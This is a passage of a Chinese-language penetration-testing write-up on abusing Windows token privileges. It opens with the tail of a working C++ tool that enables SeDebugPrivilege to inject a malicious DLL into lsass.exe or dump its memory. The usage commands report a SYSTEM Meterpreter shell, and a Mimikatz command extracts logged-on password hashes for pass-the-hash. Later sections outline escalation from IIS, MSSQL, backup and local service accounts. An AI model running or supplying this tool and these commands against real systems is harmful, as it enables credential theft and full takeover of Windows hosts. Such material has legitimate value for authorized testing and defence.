		status = NT_SUCCESS(NtAllocateVirtualMemory(hProcess, &lpDllAddr, 0, &dwSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE));
		if (!status)
		{
			printf("[-] NtAllocateVirtualMemory Error: [%u].\n", GetLastError());
			return status;
		}
		wprintf(L"[*] Allocate virtual memory space in a %ws process: 0x%016llx\n", lpProcessName, lpDllAddr);

		// Write DLL path data to the allocated memory.
		status = NT_SUCCESS(NtWriteVirtualMemory(hProcess, lpDllAddr, (LPVOID)lpDllFileName, dwSize, NULL));
		if (!status)
		{
			printf("[-] NtWriteVirtualMemory Error: [%u].\n", GetLastError());
			return status;
		}
		wprintf(L"[*] Write DLL path to the allocated memory.\n");

		// Get the LoadLibraryW function address through kernel32.dll.
		pLoadLibraryProc = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
		if (pLoadLibraryProc == NULL)
		{
			printf("[-] GetProcAddress Error: [%u].\n", GetLastError());
			return status;
		}
		wprintf(L"[*] Get address of LoadLibraryW: 0x%016llx.\n", pLoadLibraryProc);

		// Use CreateRemoteThread to create a remote thread for DLL injection.
		//hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryProc, lpDllAddr, 0, NULL);
		status = NT_SUCCESS(NtCreateThreadEx(&hThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)pLoadLibraryProc, lpDllAddr, 0, 0, 0, 0, NULL));
		if (!status)
		{
			wprintf(L"[-] NtCreateThreadEx Error: [%u].\n", GetLastError());
			return status;
		}
		wprintf(L"[*] Create a remote thread for DLL injection.\n");

		WaitForSingleObject(hThread, -1);
		CloseHandle(hProcess);
	}
	else if (!wcscmp(expType, L"Minidump"))
	{
		dumpFile = CreateFileW(lpOutputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (dumpFile == INVALID_HANDLE_VALUE)
		{
			wprintf(L"[-] CreateFileW Error: [%u].\n", GetLastError());
			return status;
		}
		status = MiniDumpWriteDump(hProcess, dwProcessId, dumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
		if (!status)
		{
			wprintf(L"[-] MiniDumpWriteDump Error: [%u].\n", GetLastError());
			return status;
		}
		wprintf(L"[*] Dump the memory of %ws process into %ws.\n", lpProcessName, lpOutputFile);
	}

	return status;
}

BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR lpName)
{
	BOOL status = FALSE;
	LUID luidValue = { 0 };
	TOKEN_PRIVILEGES tokenPrivileges;

	// Get the LUID value of the privilege for the local system
	if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
	{
		wprintf(L"[-] LookupPrivilegeValue Error: [%u].\n", GetLastError());
		return status;
	}

	// Set escalation information
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luidValue;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Elevate Process Token Access
	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
	{
		wprintf(L"[-] AdjustTokenPrivileges Error: [%u].\n", GetLastError());
		return status;
	}
	else
	{
		status = TRUE;
	}
	return status;
}

void PrintUsage()
{
	wprintf(
		L"Abuse of SeDebugPrivilege by @WHOAMI (whoamianony.top)\n\n"
		L"Arguments:\n"
		L"  -h                          Show this help message and exit.\n"
		L"  -e <Injection, Minidump>    Choose the type of exploit.\n"
		L"  -p <ProcessName>            Specifies the system process name.\n"
		L"  -m <DLL>                    Specifies the malicious DLL path.\n"
		L"  -o <DLL>                    The file the process memory is dumped to.\n"
	);
}

int wmain(int argc, wchar_t* argv[])
{
	HANDLE hToken = NULL;
	LPCWSTR expType = L"Injection";
	LPCWSTR lpProcessName = L"lsass.exe";
	LPCWSTR lpDllFileName = NULL;
	LPCWSTR lpOutputFile = NULL;

	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
		case 'h':
			PrintUsage();
			return 0;
		case 'e':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				expType = (LPCWSTR)argv[1];
			}
			break;
		case 'p':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				lpProcessName = (LPCWSTR)argv[1];
			}
			break;
		case 'm':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				lpDllFileName = (LPCWSTR)argv[1];
			}
			break;
		case 'o':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				lpOutputFile = (LPCWSTR)argv[1];
			}
			break;
		default:
			wprintf(L"[-] Invalid Argument: %s.\n", argv[1]);
			PrintUsage();
			return 0;
		}

		++argv;
		--argc;
	}

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		wprintf(L"[-] OpenProcessToken Error: [%u].\n", GetLastError());
		return 0;
	}
	// Enable SeDebugPrivilege for the current process token.
	if (EnableTokenPrivilege(hToken, SE_DEBUG_NAME))
	{
		if (ExploitSeDebugPrivilege(expType, lpProcessName, lpDllFileName, lpOutputFile))
		{
			return 1;
		}
	}
}
```

将编译并生成好的 SeBackupPrivilege.exe 上传到目标主机，执行以下命令，将恶意的 DLL 注入到 lsass.exe 进程中，如下图所示，成功获得 SYSTEM 权限的 Meterpreter。

```powershell
SeDebugPrivilege.exe -e "Injection" -p "lsass.exe" -m "C:\Users\Marcus\shell.dll"
```

![image-20230215105701491](C:\Users\whoami\AppData\Roaming\Typora\typora-user-images\image-20230215105701491.png)

执行以下命令，将 lsass.exe 进程的内存转储到 lsass.dmp 文件中，如下图所示。

```powershell
SeDebugPrivilege.exe -e "Minidump" -p "lsass.exe" -o ".\lsass.dmp"
```

![image-20230215151405876](C:\Users\whoami\AppData\Roaming\Typora\typora-user-images\image-20230215151405876.png)

将 lsass.dmp 下载到本地，通过 Mimikatz 离线解析并提取出已登陆的用户哈希，如下图所示。

```c++
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
```

![image-20230215150653195](C:\Users\whoami\AppData\Roaming\Typora\typora-user-images\image-20230215150653195.png)

得到的管理员用户哈希可以用来执行哈希传递，并获取系统管理权限。

## ## SeTrustedCredmanAccessPrivilege *















## ## SeEnableDelegationPrivilege *













# # Abusing Existing Service Accounts

攻击者以本地服务帐户访问机器。

在许多常见场景中，攻击者能够在目标计算机上的服务帐户上下文中执行代码，包括：

- 服务本身因某些漏洞而受到损害。典型场景包括允许在运行 IIS 帐户上下文中执行的 Web 应用程序漏洞，以及 xp_cmdshell 可用于在 MSSQL 服务帐户上下文中运行代码的 SQL 注入漏洞。
- 服务帐户凭据以某种方式泄露。
- Kerberoast 类型的攻击。 从域控制器为目标帐户请求 Kerberos 票证。此票证的一部分使用目标帐户的密码哈希进行加密。 这可以有效地离线破解以产生帐户密码。

在任何这些场景中，如果服务帐户恰好具有上一节中概述的特权之一，则可以通过利用该项目中的相应模块来简单地获得本地特权升级。

## ## MSSQL / IIS

如果我们使用 Sysinternals 的 AccessChk 工具检查分配给 MSSQL 和 IIS 服务帐户的默认权限，我们会发现以下内容：

```cmd
IIS - SeImpersonatePrivilege - BUILTIN\IIS_IUSRS
MSSQL - SeAssignPrimaryTokenPrivilege - 
                            NT SERVICE\SQLAgent$SQLEXPRESS, 
                            NT SERVICE\MSSQLLaunchpad$SQLEXPRESS, 
                            NT SERVICE\MSSQL$SQLEXPRESS
```

通过利用该项目中的模块，这些权限对于本地特权提升来说已经足够了。 这些帐户的失陷是一种非常常见的渗透测试场景。每当 MSSQL 中的 SQL 注入或 IIS 中的 Web 应用程序漏洞被利用来获得命令执行时，攻击者最终都会获得这些特权。

## ## Backup Products

市场上的每个商业备份产品都将以某种提升的特权运行。在许多情况下，备份服务帐户将以 SYSTEM 权限运行，无需提升特权。然而，在管理员开始变得聪明起来的地方，我们开始看到这些帐户的权限变得更加受限。

以下是 Veritas NetBackup 解决方案所需的最低权限，无耻地从他们的网站 (https://www.veritas.com/support/en_US/article.TECH36718) 借来的：

- *Act as a part of Operating System ( Only for Windows Server 2000 ).
- *Create a token object.
- Log on as a service.
- Logon as a batch job.
- Manage auditing and security log.
- *Backup files and directories.
- *Restore files and directories.

请注意列表中我们用星号 (*) 标记的 4 项。考虑到本项目中描述的技术之一，这些特权中的任何一个都可以单独用于获得本地特权提升。

## ## Local Service Accounts

每台 Windows 计算机上也有预定义的服务帐户，其中包含可用于本地特权提升的权限。它们是：

- NT AUTHORITY\SERVICE
- NT AUTHORITY\NETWORK SERVICE
- NT AUTHORITY\LOCAL SERVICE

其中每一个都有略微不同的特权，有些包含多个可利用的特权，但它们都包含可利用的 SeImpersonatePrivilege 特权。

如果攻击者能够以某种方式在这些受限本地帐户之一的上下文中获得对系统的访问权限，他们可以使用上述技术将他们的权限提升到 NT AUTHORITY\SYSTEM。





































































## Ending......

参考文献：

> 
